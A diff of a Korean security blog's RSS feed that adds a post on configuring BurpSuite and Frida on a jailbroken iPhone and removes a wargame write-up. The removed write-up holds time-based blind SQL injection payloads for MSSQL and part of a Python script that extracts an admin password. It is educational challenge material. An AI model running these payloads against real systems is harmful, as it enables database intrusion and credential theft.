@@ -5,7 +5,7 @@
     <atom:link href="/feed.xml" rel="self" type="application/rss+xml"/>
     <link>http://192.168.222.143:4000/</link>
     <description>mingzzi's blog</description>
-    <pubDate>Sun, 12 Jan 2020 21:22:49 +0900</pubDate>
+    <pubDate>Thu, 16 Jan 2020 11:23:46 +0900</pubDate>
     
       <item>
         <title>[Database-DB2] 새로운 User 생성 및 권한 부여하기</title>
@@ -585,7 +585,64 @@ ImportError: DLL load failed: 지정된 모듈을 찾을 수 없습니다.
       </item>
     
       <item>
-        <title>[iOS] 12.1.4 탈옥하기 (Without ignition, impactor)</title>
+        <title>[iOS] 아이폰 BurpSuite 및 Frida 사용 세팅하기</title>
+        <link>/pentesting/ios/2019/12/12/iOS-setting.html</link>
+        <guid isPermaLink="true">/pentesting/ios/2019/12/12/iOS-setting.html</guid>
+        <description>&lt;p&gt;이번에는 모의해킹을 하는데 필요한 &lt;code class=&quot;highlighter-rouge&quot;&gt;BurpSuite&lt;/code&gt;와 &lt;code class=&quot;highlighter-rouge&quot;&gt;Frida&lt;/code&gt;를 탈옥한 아이폰에 세팅하는 법을 정리한다.&lt;/p&gt;
+
+&lt;!--more--&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Frida&lt;/code&gt;를 설치하기 위해 &lt;code class=&quot;highlighter-rouge&quot;&gt;Cydia&lt;/code&gt;를 사용하기 때문에 탈옥은 필수다.&lt;/p&gt;
+
+&lt;p&gt;만약 탈옥이 안되어 있다면 아래의 글을 참고하면 될 것 같다.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://mingzz1.github.io/pentesting/ios/2019/12/10/iOS-jailbreak.html&quot;&gt;iOS 탈옥하기&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;frida-설치&quot;&gt;Frida 설치&lt;/h3&gt;
+
+&lt;p&gt;앞서 말했듯, &lt;code class=&quot;highlighter-rouge&quot;&gt;Frida&lt;/code&gt;를 설치하기 위해 &lt;code class=&quot;highlighter-rouge&quot;&gt;Cydia&lt;/code&gt;가 필요하다.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Cydia&lt;/code&gt;를 실행시킨 후 하단의 &lt;code class=&quot;highlighter-rouge&quot;&gt;소스 &amp;gt; 편집 &amp;gt; 추가 &amp;gt; URL(https://build.frida.re) 입력 &amp;gt; 소스추가&lt;/code&gt;를 차례로 한다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/pen-testing/ios/setting/setting_01.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;이 후 검색창에서 &lt;code class=&quot;highlighter-rouge&quot;&gt;Frida&lt;/code&gt;를 검색 해 아래의 어플리케이션을 다운 받으면 된다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/pen-testing/ios/setting/setting_02.png&quot; alt=&quot;&quot; width=&quot;50%&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;일반적으로 &lt;code class=&quot;highlighter-rouge&quot;&gt;Frida&lt;/code&gt;를 설치하면 &lt;code class=&quot;highlighter-rouge&quot;&gt;frida-server&lt;/code&gt;는 자동으로 실행 중이기 때문에 따로 더 해 줄 것은 없다.&lt;/p&gt;
+
+&lt;h3 id=&quot;burpsuite-사용-설정&quot;&gt;BurpSuite 사용 설정&lt;/h3&gt;
+
+&lt;p&gt;두 번째는 &lt;code class=&quot;highlighter-rouge&quot;&gt;BurpSuite&lt;/code&gt;를 사용하기 위한 설정 방법이다.&lt;/p&gt;
+
+&lt;p&gt;먼저 &lt;code class=&quot;highlighter-rouge&quot;&gt;설정 &amp;gt; Wifi &amp;gt; 사용 중인 Wifi 옆의 information 확인 &amp;gt; 하단의 프록시 구성&lt;/code&gt;을 선택한다.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;프록시 구성&lt;/code&gt; 화면에서 &lt;code class=&quot;highlighter-rouge&quot;&gt;수동&lt;/code&gt;을 선택한 후, &lt;code class=&quot;highlighter-rouge&quot;&gt;서버&lt;/code&gt;와 &lt;code class=&quot;highlighter-rouge&quot;&gt;포트&lt;/code&gt;를 설정 해 주면 되는데, 이 때 아이폰은 &lt;code class=&quot;highlighter-rouge&quot;&gt;BurpSuite&lt;/code&gt;를 실행 할 PC와 같은 네트워크에 있어야 하며, &lt;code class=&quot;highlighter-rouge&quot;&gt;프록시 서버&lt;/code&gt;의 &lt;code class=&quot;highlighter-rouge&quot;&gt;IP 주소&lt;/code&gt;는 &lt;code class=&quot;highlighter-rouge&quot;&gt;PC의 IP 주소&lt;/code&gt;로 적어주면 된다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/pen-testing/ios/setting/setting_03.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;프록시 서버 설정을 완료 한 후에는 PC에서 &lt;code class=&quot;highlighter-rouge&quot;&gt;BurpSuite&lt;/code&gt;를 실행하고, 아이폰의 &lt;code class=&quot;highlighter-rouge&quot;&gt;Safari&lt;/code&gt; 어플리케이션을 이용 해 &lt;code class=&quot;highlighter-rouge&quot;&gt;http://burp&lt;/code&gt;에 접속한다.&lt;/p&gt;
+
+&lt;p&gt;그러면 아래와 같은 페이지를 확인할 수 있는데, 여기서 오른쪽 상단의 &lt;code class=&quot;highlighter-rouge&quot;&gt;CA Certificate&lt;/code&gt;을 선택하고 &lt;code class=&quot;highlighter-rouge&quot;&gt;허용&lt;/code&gt;을 눌러 주면 &lt;code class=&quot;highlighter-rouge&quot;&gt;HTTPS&lt;/code&gt; 메시지를 &lt;code class=&quot;highlighter-rouge&quot;&gt;BurpSuite&lt;/code&gt;에서 잡기 위한 인증서를 설치할 수 있다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/pen-testing/ios/setting/setting_04.png&quot; alt=&quot;&quot; width=&quot;50%&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;아이폰에서는 이 인증서를 설치 해 주어야 한다.&lt;/p&gt;
+
+&lt;p&gt;아래와 같이 &lt;code class=&quot;highlighter-rouge&quot;&gt;설정 &amp;gt; 일반 &amp;gt; 기기관리 &amp;gt; 인증서 설치&lt;/code&gt; 메뉴로 들어가 인증서를 설치한다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/pen-testing/ios/setting/setting_05.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;또한 &lt;code class=&quot;highlighter-rouge&quot;&gt;설정 &amp;gt; 일반 &amp;gt; 정보 &amp;gt; 인증서 신뢰 설정 &amp;gt; PortSwigger CA 활성화&lt;/code&gt;를 해 주어야 정상적으로 사용할 수 있다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/pen-testing/ios/setting/setting_06.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Thu, 12 Dec 2019 00:00:00 +0900</pubDate>
+      </item>
+    
+      <item>
+        <title>[iOS] 3uTools 통해 12.1.4 탈옥하기(Without ignition, impactor)</title>
         <link>/pentesting/ios/2019/12/10/iOS-jailbreak.html</link>
         <guid isPermaLink="true">/pentesting/ios/2019/12/10/iOS-jailbreak.html</guid>
         <description>&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Android&lt;/code&gt;에서 루팅이 필요하듯이, &lt;code class=&quot;highlighter-rouge&quot;&gt;iOS&lt;/code&gt; 앱 분석을 위해서는 탈옥이 필요하다.&lt;/p&gt;
@@ -605,7 +662,7 @@ ImportError: DLL load failed: 지정된 모듈을 찾을 수 없습니다.
 
 &lt;p&gt;만약 탈옥을 하기 전에 &lt;code class=&quot;highlighter-rouge&quot;&gt;iOS&lt;/code&gt; 최신 버전 업데이트 없이 초기화를 하고 싶은 경우 아래 포스팅을 확인 해 보면 된다.(초기화가 필수는 아니다.)&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://mingzz1.github.io/iOS-initialize&quot;&gt;iOS 초기화 방법&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://mingzz1.github.io/pentesting/ios/2019/12/10/iOS-initialize.html&quot;&gt;iOS 초기화 방법&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;일단 &lt;code class=&quot;highlighter-rouge&quot;&gt;Unc0ver&lt;/code&gt;만 폰에 설치할 수 있으면 탈옥은 거의 끝난 것이다.&lt;/p&gt;
 
@@ -720,10 +777,6 @@ ImportError: DLL load failed: 지정된 모듈을 찾을 수 없습니다.
 &lt;p&gt;여기까지 하면 탈옥은 완료된다.&lt;/p&gt;
 
 &lt;p&gt;모의해킹을 하려면 몇 가지 더 설치해야 하지만 여기에 다 담기에는 내용이 너무 길어져 다른 포스팅으로 나누어 적을 예정이다.&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;공장초기화를 해야하느냐&lt;/code&gt; 부터 &lt;code class=&quot;highlighter-rouge&quot;&gt;Impactor 오류&lt;/code&gt;에, &lt;code class=&quot;highlighter-rouge&quot;&gt;Ignition&lt;/code&gt;에서의 설치 실패까지 너무 험난했다ㅠㅠ 오전 시간 다 날림…&lt;/p&gt;
-
-&lt;p&gt;이번에 이렇게 자세히 적어두었으니 다음엔 삽질 조금 적게 하길!&lt;/p&gt;
 </description>
         <pubDate>Tue, 10 Dec 2019 00:00:00 +0900</pubDate>
       </item>
@@ -2117,182 +2170,6 @@ MUMMY Clear!
 &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;MUMMY Clear&lt;/code&gt;&lt;/p&gt;
 </description>
         <pubDate>Sat, 03 Aug 2019 00:00:00 +0900</pubDate>
-      </item>
-    
-      <item>
-        <title>[Lord of SQL Injection] LoS - yeti 문제풀이</title>
-        <link>/wargame/lord%20of%20sql%20injection/2019/07/29/los-yeti.html</link>
-        <guid isPermaLink="true">/wargame/lord%20of%20sql%20injection/2019/07/29/los-yeti.html</guid>
-        <description>&lt;p&gt;이번 문제 이름은 &lt;code class=&quot;highlighter-rouge&quot;&gt;yeti&lt;/code&gt;다.&lt;/p&gt;
-
-&lt;p&gt;소스코드를 짜서 풀어야 하는 &lt;code class=&quot;highlighter-rouge&quot;&gt;Blind SQL Injection&lt;/code&gt; 문제였다.&lt;/p&gt;
-
-&lt;!--more--&gt;
-
-&lt;p&gt;코드는 다음과 같다.&lt;/p&gt;
-
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-----------------------------------------------------------------
-query : select id from prob_yeti where id='' and pw=''
------------------------------------------------------------------
-
-&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;./config.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;login_chk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-  &lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mssql_connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;yeti&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;preg_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/master|sys|information|;/i'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;No Hack ~_~&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;preg_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/master|sys|information|;/i'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'pw'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;No Hack ~_~&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;nv&quot;&gt;$query&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;select id from prob_yeti where id='&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;' and pw='&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'pw'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;'&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;hr&amp;gt;query : &amp;lt;strong&amp;gt;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$query&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;lt;/strong&amp;gt;&amp;lt;hr&amp;gt;&amp;lt;br&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-  &lt;span class=&quot;nb&quot;&gt;sqlsrv_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-
-  &lt;span class=&quot;nv&quot;&gt;$query&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;select pw from prob_yeti where id='admin'&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
-  &lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sqlsrv_fetch_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sqlsrv_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'pw'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'pw'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;solve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;yeti&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
-  &lt;span class=&quot;nb&quot;&gt;highlight_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;__FILE__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;문제를 풀기 위해서는 &lt;code class=&quot;highlighter-rouge&quot;&gt;id='admin'&lt;/code&gt;일 때 &lt;code class=&quot;highlighter-rouge&quot;&gt;pw&lt;/code&gt;의 값을 알아야 한다.&lt;/p&gt;
-
-&lt;p&gt;그런데 &lt;code class=&quot;highlighter-rouge&quot;&gt;pw&lt;/code&gt;의 값을 정확하게 알아야 하는데 내가 입력한 쿼리의 결과가 참인지 거짓인지 구분할 만한 무언가가 없다.&lt;/p&gt;
-
-&lt;p&gt;그래서 &lt;code class=&quot;highlighter-rouge&quot;&gt;Time based Blind SQL Injection&lt;/code&gt;를 통해 &lt;code class=&quot;highlighter-rouge&quot;&gt;pw&lt;/code&gt;의 값을 알아내기로 했다.&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;MySQL&lt;/code&gt;에서는 그냥 &lt;code class=&quot;highlighter-rouge&quot;&gt;sleep&lt;/code&gt;를 사용하면 됬었는데, &lt;code class=&quot;highlighter-rouge&quot;&gt;MSSQL&lt;/code&gt;에서는 &lt;code class=&quot;highlighter-rouge&quot;&gt;sleep&lt;/code&gt;가 딱히 없는 것 같다.&lt;/p&gt;
-
-&lt;p&gt;그래서 &lt;code class=&quot;highlighter-rouge&quot;&gt;waitfor delay&lt;/code&gt;를 사용했다.&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;waitfor delay [지연시간]&lt;/code&gt;의 형태로 사용하면 되는데, 이 때 &lt;code class=&quot;highlighter-rouge&quot;&gt;지연시간&lt;/code&gt;은 &lt;code class=&quot;highlighter-rouge&quot;&gt;00:00:05&lt;/code&gt;와 같이 &lt;code class=&quot;highlighter-rouge&quot;&gt;시:분:초&lt;/code&gt;의 형태로 넣어 주어야 한다.&lt;/p&gt;
-
-&lt;p&gt;먼저 아래의 값을 입력 해 &lt;code class=&quot;highlighter-rouge&quot;&gt;waitfor delay&lt;/code&gt;로 문제를 풀 수 있는지 테스트 해 보았다.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;?id=a&amp;amp;pw=1' if 1=1 waitfor delay '00:00:03' else waitfor delay '00:00:00' --
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;if&lt;/code&gt;문을 통해 &lt;code class=&quot;highlighter-rouge&quot;&gt;1=1&lt;/code&gt;의 조건을 검사하고 해당 조건이 참이라면 3초 동안 지연을, 아니라면 지연을 하지 않는 쿼리문이다.&lt;/p&gt;
-
-&lt;p&gt;해당 쿼리 테스트 결과 아래와 같이 3초 지연된 결과를 받을 수 있었다.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;./images/los/yeti/yeti_01.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;이제 위의 쿼리에서 &lt;code class=&quot;highlighter-rouge&quot;&gt;1=1&lt;/code&gt; 부분을 &lt;code class=&quot;highlighter-rouge&quot;&gt;pw&lt;/code&gt;의 길이와 값을 알아내기 위한 쿼리로 바꾸면 문제를 풀 수 있을 것이다.&lt;/p&gt;
-
-&lt;p&gt;길이를 알아내기 위해서 아래와 같은 쿼리를 사용했다.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=a&amp;amp;pw=1' if ((select len(pw) from prob_yeti where id='admin') = 1) waitfor delay '00:00:03' else waitfor delay '00:00:00' -- 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;prob_yeti&lt;/code&gt; 테이블에서 &lt;code class=&quot;highlighter-rouge&quot;&gt;id='admin'&lt;/code&gt;인 행의 &lt;code class=&quot;highlighter-rouge&quot;&gt;pw 길이&lt;/code&gt;를 &lt;code class=&quot;highlighter-rouge&quot;&gt;select&lt;/code&gt;하고 만약 그 결과가 &lt;code class=&quot;highlighter-rouge&quot;&gt;3초 이상 지연&lt;/code&gt;된다면 해당 값이 길이일 것이다.&lt;/p&gt;
-
-&lt;p&gt;또한 값을 알아내기 위해서는 아래와 같은 쿼리를 사용했다.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=a&amp;amp;pw=1' if ((select pw from prob_yeti where id='admin') like 'a%') waitfor delay '00:00:03' else waitfor delay '00:00:00' -- 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;like&lt;/code&gt;을 사용했는데, 만약 &lt;code class=&quot;highlighter-rouge&quot;&gt;prob_yeti&lt;/code&gt; 테이블에서 &lt;code class=&quot;highlighter-rouge&quot;&gt;id='admin'&lt;/code&gt;인 행의 &lt;code class=&quot;highlighter-rouge&quot;&gt;pw&lt;/code&gt;를 추출 했을 때 맨 첫번째 글자가 &lt;code class=&quot;highlighter-rouge&quot;&gt;a&lt;/code&gt;라면 3초 지연 후 결과 값을 얻을 수 있을 것이다.&lt;/p&gt;
-
-&lt;p&gt;이를 바탕으로 아래와 같이 자동화 코드를 구현했다.&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;urllib2&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;urllib&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;https://los.rubiya.kr/chall/yeti_e6afc70b892148ced2d1e063c1230255.php?id=a&amp;amp;pw=1'&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dict&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PHPSESSID&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;YOUR SESSION ID&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+] Start&quot;&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+] Find length of the password&quot;&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot; if ((select len(pw) from prob_yeti where id='admin') = &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;) waitfor delay '00:00:03' else waitfor delay '00:00:00' -- &quot;&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[-] Error occur&quot;&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;
